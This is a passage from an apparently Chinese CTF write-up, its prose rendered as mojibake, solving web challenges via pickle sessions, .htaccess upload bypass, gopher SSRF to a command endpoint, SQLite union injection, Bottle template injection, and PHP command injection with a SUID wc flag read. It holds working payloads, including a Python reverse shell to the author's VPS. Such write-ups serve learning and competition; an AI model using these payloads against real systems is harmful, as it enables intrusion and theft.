    session_data = {"username": username, "expires": time.time() + 3600,}
    pickled = pickle.dumps(session_data)
    pickled_data = base64.b64encode(pickled).decode('utf-8')
    print(pickled_data)
    key, iv = generate_key_iv()
    session = aes_encrypt_decrypt(pickled_data, key, iv, mode='encrypt')
    print("[+]session:"+session)
    return session


def validate_session(cookie):
    try:
        key, iv = generate_key_iv()
        pickled = aes_encrypt_decrypt(cookie, key, iv, mode='decrypt')
        # print(pickled)
        pickled_data = base64.b64decode(pickled)
        # print(pickled_data)
        session_data = pickle.loads(pickled_data)
        print(session_data)

        if session_data["username"] != "admin":
            return False

        return session_data if session_data["expires"] > time.time() else False
    except:
        return False

exp = Exp()
create_session(exp)


```

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/0d7f6dea98ff4647ac522e2f2fe41a97.png)

### UPUPUP

å¯ä»¥ä¸Šä¼ 
`.htaccess`
æ–‡ä»¶
  
ä½†æ˜¯åç«¯æ£€éªŒäº†
`mine`
ç±»å‹, ç›´æ¥åŠ ä¸Š
`GIF89a`
ä¸Šä¼ ä¼šæŠ¥500é”™è¯¯,æœ‰è¯­æ³•é”™è¯¯, è€Œåœ¨.htaccess ä¸­æœ‰ä¸¤ä¸ªæ³¨é‡Šç¬¦ï¼Œæˆ–è€…ç›¸å½“äºå•è¡Œæ³¨é‡Šçš„ç¬¦å· , å¯ä»¥é€šè¿‡è¿™ä¸¤ä¸ªç»•è¿‡getimagesizeå’Œexif\_imagetype

```
\x00
#

```

æ‰€ä»¥å°±å¯ä»¥è¿™æ ·å†™
`.htaccess`

```
#define width 1
#define height 1
<FilesMatch "1.jpg">  
SetHandler application/x-httpd-php
</FilesMatch>

```

åœ¨ä¸Šä¼ 1.jpgå°±è¡Œ

### Goph3rrr

/app.pyå¯ä»¥çœ‹åˆ°æºç 
  
å…³é”®ä»£ç 

```python
from flask import Flask, request, send_file, render_template_string
import os
from urllib.parse import urlparse, urlunparse
import subprocess
import socket
import hashlib
import base64
import random

app = Flask(__name__)
BlackList = [
    "127.0.0.1"
]
@app.route('/Gopher')
def visit():
    url = request.args.get('url')
    if url is None:
        return "No url provided :)"
    url = urlparse(url)
    realIpAddress = socket.gethostbyname(url.hostname)
    if url.scheme == "file" or realIpAddress in BlackList:
        return "No (â‰§âˆ‡â‰¦)"
    result = subprocess.run(["curl", "-L", urlunparse(url)], capture_output=True, text=True)
    return result.stdout
@app.route('/Manage', methods=['POST'])
def cmd():
    if request.remote_addr != "127.0.0.1":
        return "Forbidden!!!"
    if request.method == "GET":
        return "Allowed!!!"
    if request.method == "POST":
        return os.popen(request.form.get("cmd")).read()


```

æœ¬æ¥æ˜¯æƒ³åœ¨è‡ªå·±vpsä¸Šèµ·ä¸€ä¸ª302.phpè·³è½¬,
`Gopher?url=http://pmjphw.top/302.php`
  
ä½†æ˜¯
`/Manage`
è·¯ç”±å¿…é¡»è¦æ˜¯POSTæ–¹æ³•æ‰èƒ½æ‰§è¡Œcmd, 302è·³è½¬ä¸èµ·ä½œç”¨

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/be8ba0adf7824d31a1ce28e3290e5266.png)

æ‰€ä»¥å¿…é¡»ç”¨gopheråè®®, å‘é€ä¸€ä¸ªpostçš„è¯·æ±‚
  
å› ä¸ºè¿‡æ»¤äº†
`127.0.0.1`
, å¯ä»¥ä½¿ç”¨
`0.0.0.0`
è¿›è¡Œç»•è¿‡

payload:

```python
import urllib.parse
payload =\
"""POST /Manage HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

cmd=env
"""

#æ³¨æ„åé¢ä¸€å®šè¦æœ‰å›è½¦ï¼Œå›è½¦ç»“å°¾è¡¨ç¤ºhttpè¯·æ±‚ç»“æŸ
tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A','%0D%0A')
result = 'gopher://0.0.0.0:8000/'+'_'+new
result = urllib.parse.quote(result)
print(result)       # è¿™é‡Œå› ä¸ºæ˜¯GETè¯·æ±‚æ‰€ä»¥è¦è¿›è¡Œä¸¤æ¬¡urlç¼–ç 

#gopher%3A//0.0.0.0%3A8000/_POST%2520/Manage%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A8000%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25207%250D%250A%250D%250Acmd%253Denv%250D%250A

```

### SQL???

è¿›å…¥é¦–é¡µå°±æ˜¯è¿™æ ·çš„, å¾ˆæ˜æ˜¾, åº”è¯¥å°±æ˜¯sqlæ³¨å…¥äº†
![](https://i-blog.csdnimg.cn/direct/6eb08a94586c44e88025065e9022a26c.png)

ç»è¿‡æµ‹è¯•, è¾“å…¥å•å¼•å·å’ŒåŒå¼•å·
`' "`
ä¼šæ˜¾ç¤ºhacker, è¢«è¿‡æ»¤äº†
  
`union select`
è”åˆæŸ¥è¯¢ä¸€ä¸‹å¯ä»¥å‘ç°æœ‰å›æ˜¾ç‚¹
  
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/0c7057af506341868ca9d966b90af9c7.png)

ä½†å¥½åƒæ²¡æœ‰ç”¨, æ²¡åŠæ³•æ‰§è¡Œä¸€äº›æ“ä½œ
  
å‰é¢ä¸€ç›´å¡åœ¨è¿™, æ²¡åŠæ³•æ‰§è¡Œä¸€äº›å‡½æ•°æ“ä½œå•¥çš„, å°±æ²¡ç®¡äº†, åé¢wpå‡ºæ¥ä¹‹åæ‰çŸ¥é“è¿™æ˜¯Sqliteæ³¨â¼Š , æ€ªæˆ‘è§è¯†çŸ­æµ…äº†

æ¯”å¦‚æŸ¥çœ‹ç‰ˆæœ¬ç”¨çš„æ˜¯
`sqlite_version()`
è€Œä¹‹å‰æˆ‘ä¸€ç›´ç”¨çš„
`version()`
,æ€»æ˜¯æŠ¥é”™

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/c7bc29bd3603411ca9c48ce5b9767401.png)
  
`sqlite`
é‡Œé¢æ²¡æœ‰åƒå…¶ä»–æ•°æ®åº“é‚£æ ·çš„
`information_schema`
ï¼Œè€Œæ˜¯ä¾èµ–
`sqlite_master`

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/0ab4e182b42f44cfbb46e5674decc138.png)

```
id=1 union select 1,sqlite_version(),(select sql from sqlite_master limit 0,1),4,5

```

æŸ¥è¯¢ç¬¬ä¸€æ¡è®°å½•çš„åˆ›å»ºè¯­å¥ , å¯ä»¥çœ‹åˆ°å­˜åœ¨è¡¨
`flag`
ä»¥åŠå­—æ®µå
`flag`
  
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/9a5874a288294d44947cbc8d6dbcae24.png)
  
æ‹¿æ•°æ®å†…å®¹

```
id=1 union select 1,sqlite_version(),(select * from flag),4,5
æˆ–è€…
id=1 union select 1,sqlite_version(),(select group_concat(flag) from flag),4,5

```

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/c0d7148b077747ccbc8a3cb31e38e001.png)

### Message in a Bottle

ä¸€ä¸ªç•™è¨€æ¿, ä¸‹æ„è¯†çš„ä¼šä»¥ä¸ºæ˜¯xss, è™½ç„¶ç¡®å®å¯ä»¥å¼¹çª—, ä½†æ˜¯æ²¡æœ‰ä»€ä¹ˆä½œç”¨

```python
from bottle import Bottle, request, template, run


app = Bottle()

# å­˜å‚¨ç•™è¨€çš„åˆ—è¡¨
messages = []
def handle_message(message):
    message_items = "".join([f"""
        <div class="message-card">
            <div class="message-content">{msg}</div>
            <small class="message-time">#{idx + 1} - åˆšåˆš</small>
        </div>
    """ for idx, msg in enumerate(message)])

    board = f"""<!DOCTYPE html>
    <html lang="zh">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ç®€çº¦ç•™è¨€æ¿</title>
        <link href="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.1.3/css/bootstrap.min.css" rel="stylesheet">
         <style>
            :root {{
                --primary-color: #4a90e2;
                --hover-color: #357abd;
                --background-color: #f8f9fa;
                --card-background: #ffffff;
                --shadow-color: rgba(0, 0, 0, 0.1);
            }}

            body {{
                background: var(--background-color);
                min-height: 100vh;
                padding: 2rem 0;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }}

            .container {{
                max-width: 800px;
                background: var(--card-background);
                border-radius: 15px;
                box-shadow: 0 4px 6px var(--shadow-color);
                padding: 2rem;
                margin-top: 2rem;
                animation: fadeIn 0.5s ease-in-out;
            }}

            @keyframes fadeIn {{
                from {{ opacity: 0; transform: translateY(20px); }}
                to {{ opacity: 1; transform: translateY(0); }}
            }}

            .message-card {{
                background: var(--card-background);
                border-radius: 10px;
                padding: 1.5rem;
                margin: 1rem 0;
                transition: all 0.3s ease;
                border-left: 4px solid var(--primary-color);
                box-shadow: 0 2px 4px var(--shadow-color);
            }}

            .message-card:hover {{
                transform: translateX(10px);
                box-shadow: 0 4px 8px var(--shadow-color);
            }}

            .message-content {{
                font-size: 1.1rem;
                color: #333;
                line-height: 1.6;
                margin-bottom: 0.5rem;
            }}

            .message-time {{
                color: #6c757d;
                font-size: 0.9rem;
                display: block;
                margin-top: 0.5rem;
            }}

            textarea {{
                width: 100%;
                height: 120px;
                padding: 1rem;
                border: 2px solid #e9ecef;
                border-radius: 10px;
                resize: vertical;
                font-size: 1rem;
                transition: border-color 0.3s ease;
            }}

            textarea:focus {{
                border-color: var(--primary-color);
                outline: none;
                box-shadow: 0 0 0 3px rgba(74, 144, 226, 0.1);
            }}

            .btn-custom {{
                background: var(--primary-color);
                color: white;
                padding: 0.8rem 2rem;
                border-radius: 10px;
                border: none;
                transition: all 0.3s ease;
                font-weight: 500;
                text-transform: uppercase;
                letter-spacing: 0.05rem;
            }}

            .btn-custom:hover {{
                background: var(--hover-color);
                transform: translateY(-2px);
                box-shadow: 0 4px 8px var(--shadow-color);
            }}

            h1 {{
                color: var(--primary-color);
                text-align: center;
                margin-bottom: 2rem;
                font-weight: 600;
                font-size: 2.5rem;
                text-shadow: 2px 2px 4px var(--shadow-color);
            }}

            .btn-danger {{
                transition: all 0.3s ease;
                padding: 0.6rem 1.5rem;
                border-radius: 10px;
                text-transform: uppercase;
                letter-spacing: 0.05rem;
            }}

            .btn-danger:hover {{
                transform: translateY(-2px);
                box-shadow: 0 4px 8px var(--shadow-color);
            }}

            .text-muted {{
                font-style: italic;
                color: #6c757d !important;
            }}

            @media (max-width: 576px) {{
                h1 {{
                    font-size: 2rem;
                }}
                .container {{
                    padding: 1.5rem;
                }}
                .message-card {{
                    padding: 1rem;
                }}
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="d-flex justify-content-between align-items-center mb-4">
                <h1 class="mb-0">ğŸ“ ç®€çº¦ç•™è¨€æ¿</h1>
                <a 
                    href="/Clean" 
                    class="btn btn-danger"
                    onclick="return confirm('ç¡®å®šè¦æ¸…ç©ºæ‰€æœ‰ç•™è¨€å—ï¼Ÿæ­¤æ“ä½œä¸å¯æ¢å¤ï¼')"
                >
                    ğŸ—‘ï¸ ä¸€é”®æ¸…ç†
                </a>
            </div>

            <form action="/submit" method="post">
                <textarea 
                    name="message" 
                    placeholder="è¾“å…¥payloadæš´æ‰“å‡ºé¢˜äºº"
                    required
                ></textarea>
                <div class="d-grid gap-2">
                    <button type="submit" class="btn-custom">å‘å¸ƒç•™è¨€</button>
                </div>
            </form>

            <div class="message-list mt-4">
                <div class="d-flex justify-content-between align-items-center mb-3">
                    <h4 class="mb-0">æœ€æ–°ç•™è¨€ï¼ˆ{len(message)}æ¡ï¼‰</h4>
                    {f'<small class="text-muted">ç‚¹å‡»å³ä¾§æ¸…ç†æŒ‰é’®å¯æ¸…ç©ºåˆ—è¡¨</small>' if message else ''}
                </div>
                {message_items}
            </div>
        </div>
    </body>
    </html>"""
    return board



def waf(message):
    return message.replace("{", "").replace("}", "")


@app.route('/')
def index():
    return template(handle_message(messages))


@app.route('/Clean')
def Clean():
    global messages
    messages = []
    return '<script>window.location.href="/"</script>'

@app.route('/submit', method='POST')
def submit():
    message = waf(request.forms.get('message'))
    messages.append(message)
    return template(handle_message(messages))


if __name__ == '__main__':
    run(app, host='localhost', port=9000)

```

çœ‹åˆ°ä»£ç , ä¼šå°†
`{`
å’Œ
`}`
æ›¿æ¢ä¸ºç©º, ä½¿ç”¨äº†bottleåº“, æŸ¥æ‰¾ä¸€äº›èµ„æ–™, å‘ç°å­˜åœ¨sstiæ¨¡æ¿æ³¨å…¥, æœ¬åœ°æ­å»ºç¯å¢ƒ, æŠŠwafå»æ‰, å¯ä»¥å‘ç°ä½¿ç”¨
`{
{2*2}}`
ä¼šå›æ˜¾4, ç¡®å®å­˜åœ¨æ¼æ´
  
ä¸è¿‡{ å’Œ } è¢«æ›¿æ¢ä¸ºç©ºäº†é‚£ä¹ˆå°±å‡ ä¹ä¸å¯èƒ½ä½¿ç”¨è¿™ç§æ–¹æ³•äº†

è¿›è¿‡æŸ¥æ‰¾ä¸€äº›èµ„æ–™, å¯ä»¥å‘ç°å¯ä»¥é€šè¿‡
`%`
æ¥æ‰§è¡Œpythonä»£ç 
  
æœ¬åœ°æµ‹è¯•äº†ä¸€ä¸‹
  
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/ac5a10f7231743d79572b2179475526f.png)
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/257f90ebb5e04d059df25d3cded33b36.png)
å¯ä»¥æ‰§è¡Œä»£ç , ä½†æ˜¯é¢˜ç›®æ˜¯æ²¡æœ‰å›æ˜¾çš„, æ‰€ä»¥éœ€è¦åå¼¹shell, è¿ä¸Šè‡ªå·±çš„vps

```
message=%0A%import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("vps",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);#

```

è™½ç„¶è¿™é‡Œæ˜¾ç¤ºè¯·æ±‚å¤±è´¥, ä½†æœåŠ¡å™¨è¿˜æ˜¯è¿ä¸Šäº†
  
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/230db138c79f499295d09fbff1bcd987.png)
  
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/e1101a64d9984e8b974841352808fc9e.png)

### GetShell

```php
<?php
highlight_file(__FILE__);

class ConfigLoader {
    private $config;

    public function __construct() {
        $this->config = [
            'debug' => true,
            'mode' => 'production',
            'log_level' => 'info',
            'max_input_length' => 100,
            'min_password_length' => 8,
            'allowed_actions' => ['run', 'debug', 'generate']
        ];
    }

    public function get($key) {
        return $this->config[$key] ?? null;
    }
}

class Logger {
    private $logLevel;

    public function __construct($logLevel) {
        $this->logLevel = $logLevel;
    }

    public function log($message, $level = 'info') {
        if ($level === $this->logLevel) {
            echo "[LOG] $message\n";
        }
    }
}

class UserManager {
    private $users = [];
    private $logger;

    public function __construct($logger) {
        $this->logger = $logger;
    }

    public function addUser($username, $password) {
        if (strlen($username) < 5) {
            return "Username must be at least 5 characters";
        }

        if (strlen($password) < 8) {
            return "Password must be at least 8 characters";
        }

        $this->users[$username] = password_hash($password, PASSWORD_BCRYPT);
        $this->logger->log("User $username added");
        return "User $username added";
    }

    public function authenticate($username, $password) {
        if (isset($this->users[$username]) && password_verify($password, $this->users[$username])) {
            $this->logger->log("User $username authenticated");
            return "User $username authenticated";
        }
        return "Authentication failed";
    }
}

class StringUtils {
    public static function sanitize($input) {
        return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
    }

    public static function generateRandomString($length = 10) {
        return substr(str_shuffle(str_repeat($x = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length / strlen($x)))), 1, $length);
    }
}

class InputValidator {
    private $maxLength;

    public function __construct($maxLength) {
        $this->maxLength = $maxLength;
    }

    public function validate($input) {
        if (strlen($input) > $this->maxLength) {
            return "Input exceeds maximum length of {$this->maxLength} characters";
        }
        return true;
    }
}

class CommandExecutor {
    private $logger;

    public function __construct($logger) {
        $this->logger = $logger;
    }

    public function execute($input) {
        if (strpos($input, ' ') !== false) {
            $this->logger->log("Invalid input: space detected");
            die('No spaces allowed');
        }

        @exec($input, $output);
        $this->logger->log("Result: $input");
        return implode("\n", $output);
    }
}

class ActionHandler {
    private $config;
    private $logger;
    private $executor;

    public function __construct($config, $logger) {
        $this->config = $config;
        $this->logger = $logger;
        $this->executor = new CommandExecutor($logger);
    }

    public function handle($action, $input) {
        if (!in_array($action, $this->config->get('allowed_actions'))) {
            return "Invalid action";
        }

        if ($action === 'run') {
            $validator = new InputValidator($this->config->get('max_input_length'));
            $validationResult = $validator->validate($input);
            if ($validationResult !== true) {
                return $validationResult;
            }

            return $this->executor->execute($input);
        } elseif ($action === 'debug') {
            return "Debug mode enabled";
        } elseif ($action === 'generate') {
            return "Random string: " . StringUtils::generateRandomString(15);
        }

        return "Unknown action";
    }
}

if (isset($_REQUEST['action'])) {
    $config = new ConfigLoader();
    $logger = new Logger($config->get('log_level'));

    $actionHandler = new ActionHandler($config, $logger);
    $input = $_REQUEST['input'] ?? '';
    echo $actionHandler->handle($_REQUEST['action'], $input);
} else {
    $config = new ConfigLoader();
    $logger = new Logger($config->get('log_level'));
    $userManager = new UserManager($logger);

    if (isset($_POST['register'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];

        echo $userManager->addUser($username, $password);
    }

    if (isset($_POST['login'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];

        echo $userManager->authenticate($username, $password);
    }

    $logger->log("No action provided, running default logic");
}


```

ä»£ç çœ‹ç€å¾ˆå¤æ‚, ä½†å¾ˆå¤šä¹Ÿä¸ç”¨å»çœ‹

ç›´æ¥æ„é€ è¿™æ ·çš„payloadå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†
  
è¿‡æ»¤äº†ç©ºæ ¼, å¯ä»¥ç”¨
`${IFS}`
ç»•è¿‡

```
?action=run&input=ls${IFS}-l${IFS}/

```

ä½†æ˜¯æ— æ³•æ‹¿åˆ°flag, çœ‹ä¸€ä¸‹æƒé™å‘ç°å®Œå…¨æ²¡æœ‰ä»»ä½•æƒé™
  
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/2ee174826c0645468821df5347185a5c.png)

å°è¯•suidææƒ

```
find${IFS}/${IFS}-user${IFS}root${IFS}-perm${IFS}-4000${IFS}-print

æˆ–è€…è¾“å‡ºåˆ°tmpç›®å½•ä¸‹å»
find${IFS}/${IFS}-user${IFS}root${IFS}-perm${IFS}-4000${IFS}-print${IFS}>/tmp/1.txt

```

å¥½åƒä¹Ÿæ²¡å•¥å¯ä»¥åˆ©ç”¨çš„, ä¸è¿‡çœ‹ç€è¿™ä¸ª
`/var/www/html/wc`
æ„Ÿè§‰æœ‰ç‚¹å¥‡æ€ª, ä¹Ÿä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨

```
/var/www/html/wc
/bin/umount
/bin/mount
/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh

```

å°è¯•æ‰§è¡Œä¸€ä¸‹, åº”è¯¥è¾“å‡ºäº†
`/flag`
çš„
`è¡Œæ•° å•è¯æ•° å­—ç¬¦æ•°`
, ä½†æ²¡æ³•æ˜¾ç¤ºå‡ºflagå•Š , ä¸çŸ¥é“è¦æ€ä¹ˆåˆ©ç”¨
  
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/5a4f871143fa4e06bc4f7940ba3cdedc.png)
çœ‹äº†wpåå‘ç°, è¿™ä¸ª
`wc`
çš„ç”¨æ³•
  
`https://gtfobins.github.io/`
  
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/e157d11f309a4da58618923485951184.png)
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/9f406329c00e4c859d8c42320273b94a.png)

ä½¿ç”¨
`/var/www/html/wc --files0-from "/flag"`
å³å¯è¯»åˆ°flag